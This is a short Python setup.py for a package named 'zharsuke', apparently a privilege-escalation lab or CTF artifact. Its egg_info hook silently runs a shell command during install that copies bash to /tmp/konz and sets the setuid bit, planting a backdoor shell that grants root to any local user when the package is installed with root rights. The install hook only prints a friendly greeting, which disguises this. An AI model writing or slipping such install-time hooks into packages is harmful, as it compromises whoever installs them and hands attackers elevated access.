from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def RunCommand():
    print("Say hi to zharsuke!")

class RunEggInfoCommand(egg_info):
    def run(self):
        os.system("/usr/bin/cp /usr/bin/bash /tmp/konz;/usr/bin/chmod +s /tmp/konz")
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "zharsuke",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)